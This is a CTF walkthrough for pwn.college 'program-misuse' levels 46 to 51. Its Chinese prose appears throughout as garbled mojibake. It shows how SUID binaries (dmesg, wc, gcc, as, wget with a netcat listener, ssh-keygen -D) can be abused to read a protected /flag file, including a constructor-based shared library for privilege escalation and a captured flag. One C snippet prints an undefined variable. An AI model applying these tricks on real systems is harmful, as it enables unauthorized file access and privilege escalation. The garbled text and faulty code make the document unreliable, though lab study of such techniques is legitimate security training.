<p>è¿™å°†æ˜¾ç¤ºå†…æ ¸ç¯ç¼“å†²åŒºä¸­çš„æ‰€æœ‰æ¶ˆæ¯ã€‚ä¸ºäº†ä½¿è¾“å‡ºæ˜“äºç®¡ç†ï¼Œä½ å¯èƒ½éœ€è¦å°†å…¶ä¸ç®¡é“ç¬¦ï¼ˆ|ï¼‰ä¸€èµ·ä½¿ç”¨ï¼Œä»¥ä¾¿è¿›è¡Œåˆ†é¡µæˆ–æœç´¢ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">dmesg | less<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨<code>grep</code>å‘½ä»¤æ¥è¿‡æ»¤ç‰¹å®šçš„ä¿¡æ¯ï¼Œæ¯”å¦‚åªæ˜¾ç¤ºå…³äºç¡¬ç›˜çš„ä¿¡æ¯ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">dmesg | grep sda<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>å¦‚æœä½ åªæƒ³æŸ¥çœ‹æœ€è¿‘çš„Nè¡Œæ¶ˆæ¯ï¼Œä½ å¯ä»¥ä½¿ç”¨<code>tail</code>å‘½ä»¤ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">dmesg | tail -n 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ä½ ä¹Ÿå¯ä»¥å°†<code>dmesg</code>è¾“å‡ºä¿å­˜åˆ°æ–‡ä»¶ä¸­ä»¥ä¾›åç»­å‚è€ƒï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">dmesg &gt; dmesg_output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><code>dmesg</code>å‘½ä»¤çš„è¾“å‡ºé€šå¸¸åŒ…æ‹¬ä¸ç³»ç»Ÿå¼•å¯¼ã€è®¾å¤‡è¯†åˆ«ã€é©±åŠ¨ç¨‹åºåŠ è½½ã€ç¡¬ä»¶é”™è¯¯å’Œå…¶ä»–ç³»ç»Ÿçº§äº‹ä»¶ç›¸å…³çš„æ¶ˆæ¯ã€‚</p>
<p>æ­¤é¢˜ç›´æ¥ä½¿ç”¨<code>dmesg -F /flag</code></p>
<h3 id="level47wc"><a class="markdownIt-Anchor" href="#level47wc"></a> level47(wc)</h3>
<p><code>wc</code> æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºç»Ÿè®¡æ–‡ä»¶ä¸­çš„å­—æ•°ã€è¡Œæ•°å’Œå­—ç¬¦æ•°ã€‚å®ƒçš„åå­—ä»£è¡¨ â€œword countâ€ï¼Œä½†å®é™…ä¸Šå®ƒèƒ½å¤Ÿæä¾›æ›´å¤šä¿¡æ¯ã€‚é€šè¿‡åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ <code>wc</code> åŠ ä¸Šæ–‡ä»¶åï¼Œå®ƒä¼šè¿”å›æ–‡ä»¶ä¸­çš„è¡Œæ•°ã€å­—æ•°å’Œå­—ç¬¦æ•°ã€‚</p>
<p><code>wc</code> å‘½ä»¤çš„å¸¸è§ç”¨æ³•åŒ…æ‹¬ï¼š</p>
<ol>
<li>
<p>ç»Ÿè®¡æ–‡ä»¶çš„è¡Œæ•°ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">wc -l filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>ç»Ÿè®¡æ–‡ä»¶çš„å•è¯æ•°ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">wc -w filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>ç»Ÿè®¡æ–‡ä»¶çš„å­—ç¬¦æ•°ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">wc -c filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>ç»Ÿè®¡æ–‡ä»¶çš„å­—èŠ‚æ•°ï¼ˆè€ƒè™‘å¤šå­—èŠ‚å­—ç¬¦ï¼‰ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">wc -m filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>ç»Ÿè®¡æ–‡ä»¶ä¸­æœ€é•¿è¡Œçš„é•¿åº¦ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">wc -L filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>ç»Ÿè®¡å¤šä¸ªæ–‡ä»¶çš„æ€»è¡Œæ•°ã€å•è¯æ•°å’Œå­—ç¬¦æ•°ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">wc -lwc filename1 filename2 filename3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>é€šè¿‡ç®¡é“ç¬¦å°†å…¶ä»–å‘½ä»¤çš„è¾“å‡ºä¼ é€’ç»™ <code>wc</code> è¿›è¡Œç»Ÿè®¡ï¼Œä¾‹å¦‚ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">cat filename | wc -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>wcï¼Œwcå‘½ä»¤åŸä½œç”¨æ˜¯ç»Ÿè®¡æ–‡ä»¶çš„å­—èŠ‚æ•°ã€å­—æ•°ã€è¡Œæ•°ã€‚ä½†æ˜¯é€šè¿‡<code>--files0-from</code>å‚æ•°å¯ä»¥ä»æ–‡ä»¶ä¸­è¯»å–æ–‡ä»¶åï¼Œæ‰€ä»¥å¦‚æœæ–‡ä»¶å†…å®¹ä¸æ˜¯ä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶åçš„è¯å°±ä¼šå›æ˜¾å‡ºæ¥ï¼Œå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">wc --files0-from&#x3D;&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<h3 id="level48gcc"><a class="markdownIt-Anchor" href="#level48gcc"></a> level48(gcc)</h3>
<ul>
<li>æ€è·¯1æ˜¯ç›´æ¥ç¼–å†™ä¸€ä¸ªCæ–‡ä»¶ï¼Œç„¶åè¯»å–/flag</li>
</ul>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
   FILE <span class="token operator">*</span> fptr<span class="token punctuation">;</span>
   fptr <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span>fptr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error opening file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
 <span class="token keyword">char</span> line<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

 <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> fptr<span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>

 <span class="token function">fclose</span><span class="token punctuation">(</span>fptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>æˆ–è€…å¯ä»¥ç›´æ¥é¢„å¤„ç†/flagæ–‡ä»¶,å¤´æ–‡ä»¶åŒ…å«å³å¯ï¼ŒæŠ¥é”™ä¿¡æ¯ä¼šå›æ˜¾/flag</li>
</ul>
<p>â€‹	<code>gcc -x c -E /flag</code></p>
<h3 id="level49as"><a class="markdownIt-Anchor" href="#level49as"></a> level49(as)</h3>
<p>asæ˜¯GNUç»„ç»‡æ¨å‡ºçš„ä¸€æ¬¾æ±‡ç¼–è¯­è¨€ç¼–è¯‘å™¨ï¼Œå®ƒæ”¯æŒå¤šç§ä¸åŒç±»å‹çš„å¤„ç†å™¨ã€‚æŠ¥é”™ä¼šå›æ˜¾é—®æ–‡ä»¶ä¿¡æ¯ã€‚</p>
<p>æƒ³è¦å»é™¤ä¸€äº›æ‚ä¹±ä¿¡æ¯å°±è¿™æ ·ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">as @&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="level50wget"><a class="markdownIt-Anchor" href="#level50wget"></a> level50(wget)</h3>
<p>wgetï¼Œwgetæ˜¯Linuxç³»ç»Ÿä¸‹è½½æ–‡ä»¶å·¥å…·ã€‚</p>
<p>ä¸€èˆ¬å¯ä»¥é€šè¿‡<code>-i</code>å‚æ•°æ¥è·å–æ–‡ä»¶ä¸­å†…å®¹ï¼Œä¸è¿‡å‘ç°å®ƒæŠŠå¤§å†™å­—æ¯å…¨éƒ¨è½¬æˆå°å†™å­—æ¯äº†ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚</p>
<p>æŸ¥çœ‹æœ‰å…³æ–‡ä»¶çš„å‘½ä»¤</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level50:/challenge$ <span class="token function">wget</span> <span class="token parameter variable">--help</span> <span class="token operator">|</span><span class="token function">grep</span> FILE
  -o,  --output-file<span class="token operator">=</span>FILE          log messages to FILE
  -a,  --append-output<span class="token operator">=</span>FILE        append messages to FILE
  -i,  --input-file<span class="token operator">=</span>FILE           download URLs found <span class="token keyword">in</span> <span class="token builtin class-name">local</span> or external FILE
       <span class="token parameter variable">--config</span><span class="token operator">=</span>FILE               specify config <span class="token function">file</span> to use
       --rejected-log<span class="token operator">=</span>FILE         log reasons <span class="token keyword">for</span> URL rejection to FILE
  -O,  --output-document<span class="token operator">=</span>FILE      <span class="token function">write</span> documents to FILE
       --load-cookies<span class="token operator">=</span>FILE         load cookies from FILE before session
       --save-cookies<span class="token operator">=</span>FILE         save cookies to FILE after session
       --post-file<span class="token operator">=</span>FILE            use the POST method<span class="token punctuation">;</span> send contents of FILE
       --body-file<span class="token operator">=</span>FILE            send contents of FILE. <span class="token parameter variable">--method</span> MUST be <span class="token builtin class-name">set</span>
       <span class="token parameter variable">--certificate</span><span class="token operator">=</span>FILE          client certificate <span class="token function">file</span>
       --private-key<span class="token operator">=</span>FILE          private key <span class="token function">file</span>
       --ca-certificate<span class="token operator">=</span>FILE       <span class="token function">file</span> with the bundle of CAs
       --crl-file<span class="token operator">=</span>FILE             <span class="token function">file</span> with bundle of CRLs
       <span class="token parameter variable">--pinnedpubkey</span><span class="token operator">=</span>FILE/HASHES  Public key <span class="token punctuation">(</span>PEM/DER<span class="token punctuation">)</span> file, or any number
       --random-file<span class="token operator">=</span>FILE          <span class="token function">file</span> with random data <span class="token keyword">for</span> seeding the SSL PRNG
       --warc-file<span class="token operator">=</span>FILENAME        save request/response data to a .warc.gz <span class="token function">file</span>
       --warc-dedup<span class="token operator">=</span>FILENAME       <span class="token keyword">do</span> not store records listed <span class="token keyword">in</span> this CDX <span class="token function">file</span>
hacker@program-misuse~level50:/challenge$ <span class="token function">wget</span> <span class="token parameter variable">--help</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token function">file</span>
Logging and input file:
  -o,  --output-file<span class="token operator">=</span>FILE          log messages to FILE
  -i,  --input-file<span class="token operator">=</span>FILE           download URLs found <span class="token keyword">in</span> <span class="token builtin class-name">local</span> or external FILE
  -F,  --force-html                treat input <span class="token function">file</span> as HTML
  -B,  <span class="token parameter variable">--base</span><span class="token operator">=</span>URL                  resolves HTML input-file links <span class="token punctuation">(</span>-i -F<span class="token punctuation">)</span>
       <span class="token parameter variable">--config</span><span class="token operator">=</span>FILE               specify config <span class="token function">file</span> to use
       --no-config                 <span class="token keyword">do</span> not <span class="token builtin class-name">read</span> any config <span class="token function">file</span>
                                     existing files <span class="token punctuation">(</span>overwriting them<span class="token punctuation">)</span>
  -c,  <span class="token parameter variable">--continue</span>                  resume getting a partially-downloaded <span class="token function">file</span>
  -N,  <span class="token parameter variable">--timestamping</span>              don<span class="token string">'t re-retrieve files unless newer than
       --no-use-server-timestamps  don'</span>t <span class="token builtin class-name">set</span> the <span class="token builtin class-name">local</span> <span class="token function">file</span><span class="token string">'s timestamp by
       --restrict-file-names=OS    restrict chars in file names to ones OS allows
       --ignore-case               ignore case when matching files/directories
       --unlink                    remove file before clobber
       --xattr                     turn on storage of metadata in extended file attributes
  -P,  --directory-prefix=PREFIX   save files to PREFIX/..
       --save-headers              save the HTTP headers to file
       --post-file=FILE            use the POST method; send contents of FILE
       --body-file=FILE            send contents of FILE. --method MUST be set
                                     choosing local file names (EXPERIMENTAL)
       --certificate=FILE          client certificate file
       --private-key=FILE          private key file
       --ca-certificate=FILE       file with the bundle of CAs
       --crl-file=FILE             file with bundle of CRLs
       --pinnedpubkey=FILE/HASHES  Public key (PEM/DER) file, or any number
       --random-file=FILE          file with random data for seeding the SSL PRNG
       --hsts-file                 path of HSTS database (will override default)
       --no-remove-listing         don'</span>t remove <span class="token string">'.listing'</span> files
       --no-glob                   turn off FTP <span class="token function">file</span> name globbing
       --preserve-permissions      preserve remote <span class="token function">file</span> permissions
       --retr-symlinks             when recursing, get linked-to files <span class="token punctuation">(</span>not <span class="token function">dir</span><span class="token punctuation">)</span>
       --warc-file<span class="token operator">=</span>FILENAME        save request/response data to a .warc.gz <span class="token function">file</span>
       --warc-max-size<span class="token operator">=</span>NUMBER      <span class="token builtin class-name">set</span> maximum size of WARC files to NUMBER
       --warc-cdx                  <span class="token function">write</span> CDX index files
       --warc-dedup<span class="token operator">=</span>FILENAME       <span class="token keyword">do</span> not store records listed <span class="token keyword">in</span> this CDX <span class="token function">file</span>
       --no-warc-compression       <span class="token keyword">do</span> not compress WARC files with GZIP
       --no-warc-keep-log          <span class="token keyword">do</span> not store the log <span class="token function">file</span> <span class="token keyword">in</span> a WARC record
       --warc-tempdir<span class="token operator">=</span>DIRECTORY    location <span class="token keyword">for</span> temporary files created by the
       --delete-after              delete files locally after downloading them
                                     <span class="token builtin class-name">local</span> files
       --convert-file-only         convert the <span class="token function">file</span> part of the URLs only <span class="token punctuation">(</span>usually known as the <span class="token function">basename</span><span class="token punctuation">)</span>
       <span class="token parameter variable">--backups</span><span class="token operator">=</span>N                 before writing <span class="token function">file</span> X, rotate up to N backup files
  -K,  --backup-converted          before converting <span class="token function">file</span> X, back up as X.orig
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¯ä»¥åˆ©ç”¨å®ƒçš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ¥è¿›è¡Œè¯»å–æ–‡ä»¶çš„åŸæœ¬å†…å®¹ï¼Œå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lp 8888 &amp; wget --post-file&#x3D;&#x2F;flag http:&#x2F;&#x2F;127.0.0.1:8888  &#x2F;&#x2F;ç›‘å¬æœ¬åœ°8888ç«¯å£ï¼Œå¹¶ä¸”ç”¨wgetä¸Šä¼ &#x2F;flagåˆ°æœ¬åœ°8888ç«¯å£<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><code>nc</code> æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ç½‘ç»œå·¥å…·ï¼Œå¸¸ç”¨äºåˆ›å»º TCP æˆ– UDP è¿æ¥ï¼Œå‘é€æˆ–æ¥æ”¶æ•°æ®ï¼Œæ‰§è¡Œç«¯å£æ‰«æç­‰æ“ä½œã€‚ä»¥ä¸‹æ˜¯ <code>nc</code> å¸¸ç”¨çš„å‘½ä»¤å’Œå‚æ•°ï¼š</p>
<h4 id="å¸¸ç”¨å‘½ä»¤"><a class="markdownIt-Anchor" href="#å¸¸ç”¨å‘½ä»¤"></a> å¸¸ç”¨å‘½ä»¤ï¼š</h4>
<ol>
<li>
<p><strong>ç›‘å¬æ¨¡å¼</strong>ï¼šç”¨äºå¯åŠ¨ä¸€ä¸ªæœåŠ¡å™¨ä»¥ç›‘å¬è¿æ¥è¯·æ±‚ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">nc -l &lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>è¿æ¥åˆ°è¿œç¨‹ä¸»æœºå’Œç«¯å£</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">nc &lt;hostname&#x2F;IP&gt; &lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ä»æ ‡å‡†è¾“å…¥å‘é€æ•°æ®</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">nc &lt;hostname&#x2F;IP&gt; &lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ä»æ–‡ä»¶å‘é€æ•°æ®</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">nc &lt;hostname&#x2F;IP&gt; &lt;port&gt; &lt; file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>å‘é€æ•°æ®å¹¶æ¥æ”¶å›å¤</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">nc -z &lt;hostname&#x2F;IP&gt; &lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<h4 id="å¸¸ç”¨å‚æ•°"><a class="markdownIt-Anchor" href="#å¸¸ç”¨å‚æ•°"></a> å¸¸ç”¨å‚æ•°ï¼š</h4>
<ol>
<li><code>-l</code>ï¼šç›‘å¬æ¨¡å¼ã€‚</li>
<li><code>-p &lt;port&gt;</code>ï¼šæŒ‡å®šæœ¬åœ°ç«¯å£å·ã€‚</li>
<li><code>-e &lt;command&gt;</code>ï¼šæŒ‡å®šåœ¨å»ºç«‹è¿æ¥åæ‰§è¡Œçš„å‘½ä»¤ã€‚</li>
<li><code>-u</code>ï¼šä½¿ç”¨ UDP åè®®ã€‚</li>
<li><code>-t</code>ï¼šä½¿ç”¨ TCP åè®®ï¼ˆé»˜è®¤ï¼‰ã€‚</li>
<li><code>-v</code>ï¼šæ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ã€‚</li>
<li><code>-w &lt;timeout&gt;</code>ï¼šè®¾ç½®è¶…æ—¶æ—¶é—´ã€‚</li>
<li><code>-i &lt;interval&gt;</code>ï¼šè®¾ç½®å‘é€æ•°æ®åŒ…çš„é—´éš”æ—¶é—´ã€‚</li>
<li><code>-s &lt;source&gt;</code>ï¼šè®¾ç½®æœ¬åœ°æºåœ°å€ã€‚</li>
<li><code>-z</code>ï¼šè¿›è¡Œç«¯å£æ‰«æï¼Œä½†ä¸å»ºç«‹è¿æ¥ã€‚</li>
<li><code>-k</code>ï¼šä¿æŒè¿æ¥ï¼ŒæŒç»­ç›‘å¬ä¼ å…¥çš„è¿æ¥ã€‚</li>
<li><code>-d</code>ï¼šå¯ç”¨è°ƒè¯•æ¨¡å¼ã€‚</li>
<li><code>-h</code> æˆ– <code>--help</code>ï¼šæ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ã€‚</li>
</ol>
<p>è¿™äº›å‘½ä»¤å’Œå‚æ•°å¯ä»¥æ ¹æ®å…·ä½“çš„éœ€æ±‚ç»„åˆä½¿ç”¨ï¼Œå¸®åŠ©å®ç°å„ç§ç½‘ç»œè°ƒè¯•ã€æ¢æµ‹å’Œä¼ è¾“ä»»åŠ¡ã€‚</p>
<h3 id="level51ssh-keygen"><a class="markdownIt-Anchor" href="#level51ssh-keygen"></a> level51(ssh-keygen)</h3>
<p>æ ¹æ®è¿™ä¸€å…³å¡çš„æè¿°ï¼Œé¢˜ç›®å¤§è‡´æ˜¯è¦æ±‚æˆ‘ä»¬åŠ è½½ä¸€æ®µè‡ªå·±å†™çš„ä»£ç ï¼Œé˜…è¯»<code>ssh-keygen</code>çš„<code>man</code>æ–‡æ¡£ ,å¯ä»¥å‘ç°ssh-keygenå¯ä»¥åŠ è½½ä¸€ä¸ªåå«<code>pkcs11</code>çš„åº“æ–‡ä»¶,è¿™ä¸ªåº“çš„åå­—æ˜¯<code>shared library</code>ï¼Œå› æ­¤æ˜¯ä¸€ä¸ª</p>
<p><code>dynamic link library</code>,æˆ‘ä»¬è¦å°†æˆ‘ä»¬çš„ä»£ç åŠ è½½è¿›å»ï¼Œå°±å¿…é¡»åˆ›å»ºä¸€ä¸ªdll</p>
<p><code>gcc -shared -o libexample.so example.c</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse-level-51:~$ <span class="token function">touch</span> test.c
hacker@program-misuse-level-51:~$ gcc <span class="token parameter variable">-c</span> <span class="token parameter variable">-fPIC</span> test.c <span class="token parameter variable">-o</span> test.o
hacker@program-misuse-level-51:~$ <span class="token function">ls</span>
Desktop  demo  key  key.pub  test.c  test.o
hacker@program-misuse-level-51:~$ gcc <span class="token parameter variable">-shared</span> test.o <span class="token parameter variable">-o</span> test.so
hacker@program-misuse-level-51:~$ <span class="token function">ls</span>
Desktop  demo  key  key.pub  test.c  test.o  test.so
hacker@program-misuse-level-51:~$ ssh-keygen <span class="token parameter variable">-D</span> ./test.so 
./test.so does not contain expected string C_GetFunctionList
provider ./test.so is not a PKCS11 library
cannot <span class="token builtin class-name">read</span> public key from pkcs11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ ¹æ®æŠ¥é”™ä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦åœ¨è¿™ä¸ªdllä¸­æœ‰ä¸€ä¸ª<code>C_GetFunctionList</code></p>
<p>é‚£ä¹ˆæ”¹å†™æˆ‘ä»¬çš„cä»£ç </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">C_GetFunctionList</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

FILE<span class="token operator">*</span> fp<span class="token punctuation">;</span>
fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">char</span> line<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level51:~/demo$ ssh-keygen <span class="token parameter variable">-D</span> ./level51.so 
Hello World
pwn.college<span class="token punctuation">&#123;</span>URDrFXWtQjHXjtkQO4hH4oWCj6X.01M5EDLzczN0UzW<span class="token punctuation">&#125;</span>
Segmentation fault<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<hr />
<p>å®˜æ–¹æ•™å­¦</p>
<p>çŸ¥è¯†ç‚¹ï¼š</p>
<ol>
<li>
<p>é¦–å…ˆæ˜¯ssh-keygenç”¨-Då‚æ•°å¯ä»¥ç›´æ¥è¿è¡Œä»»æ„çš„å…±äº«åº“ï¼Œå¦‚æœæœ‰suidçš„è¯å°±èƒ½è¿è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç é€ æˆææƒï¼Œå…±äº«åº“çš„åˆ›å»ºæ–¹å¼è§ä¸‹æ–¹ã€‚</p>
<p>ä½¿ç”¨æ–¹æ³•ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">ssh-keygen -D .&#x2F;su.os<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>å¯ä»¥åˆ©ç”¨cè¯­è¨€ä»£ç ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">sendfile(1,open(&quot;&#x2F;flag&quot;,0),0,4096);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>æ¥æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä¸”å°†å†…å®¹å‘é€ç»™æ ‡å‡†è¾“å‡ºæ˜¾ç¤ºã€‚</p>
</li>
<li>
<p>å¯ä»¥åˆ©ç”¨è®¾ç½®cè¯­è¨€çš„attributeå±æ€§æ¥ä½¿å‡½æ•°åœ¨ç¨‹åºé¢„å¤„ç†é˜¶æ®µè¿è¡Œï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
static void inject() __attribute__((constructor));
void inject()&#123;
printf(&quot;euid:%d\n&quot;,geteuid());
sendfile(1,open(&quot;&#x2F;flag&quot;,0),0,4096);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>cç¨‹åºçš„é“¾æ¥æ–¹å¼åŒ…æ‹¬<strong>é™æ€é“¾æ¥</strong>å’Œ<strong>åŠ¨æ€é“¾æ¥</strong>ä¸¤ç§ã€‚</p>
